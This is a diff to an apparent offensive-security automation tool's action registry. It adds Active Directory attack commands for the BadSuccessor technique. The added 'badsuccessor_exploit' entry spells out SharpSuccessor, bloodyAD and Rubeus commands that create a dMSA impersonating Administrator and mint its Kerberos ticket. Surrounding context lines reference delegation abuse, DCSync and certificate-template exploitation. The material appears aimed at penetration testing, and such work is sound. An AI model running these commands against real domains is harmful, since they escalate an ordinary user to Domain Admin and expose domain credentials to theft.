@@ -432,6 +432,23 @@ ACTION_REGISTRY: dict[str, Action] = {
          "impacket-getST / Rubeus monitor  # extract the captured DC$ TGT"],
         risk="propose", runnable=False, outputs="raw",
         note="Unconstrained delegation: coerce the DC, capture its TGT, then DCSync."),
+    "nxc_badsuccessor_check": _a("nxc_badsuccessor_check",
+        ["nxc ldap $IP -u <USER> -p '<PASS>' -M badsuccessor"],
+        runnable=False, outputs="raw",
+        note="BadSuccessor: find OUs where you can create/edit a dMSA. If MachineAccountQuota>0 "
+             "or you have CreateChild on an OU, this is a domain-user -> DA path (Server 2025 dMSA)."),
+    "badsuccessor_exploit": _a("badsuccessor_exploit",
+        ["# Windows: create a dMSA that 'succeeds' a target and mint its TGT (keys of the target):",
+         "SharpSuccessor.exe add /impersonate:Administrator /path:'OU=temp,$DC_DN' "
+         "/account:<OWNED_USER> /name:attacker_dmsa",
+         "# Linux (bloodyAD): create the dMSA and set the migration link, then ask the TGT:",
+         "bloodyAD -u <USER> -p '<PASS>' -d $DOMAIN --host $IP add dMSA attacker_dmsa "
+         "'OU=temp,$DC_DN'",
+         "Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/$DOMAIN /dmsa /opsec "
+         "/nowrap /ptt /ticket:<MACHINE_TGT>"],
+        risk="propose", runnable=False, outputs="raw",
+        note="BadSuccessor abuse: the KERB-DMSA-KEY-PACKAGE returns the predecessor's keys, so a "
+             "controlled dMSA succeeding a DA yields that DA's TGT/keys. Server 2025 only."),
     "certipy_request": _a("certipy_request",
         ["certipy find -vulnerable -json -u <USER>@$DOMAIN -p <PASS> -dc-ip $IP -o certipy",
          "certipy req -u <USER>@$DOMAIN -p <PASS> -dc-ip $IP -ca <CA> "
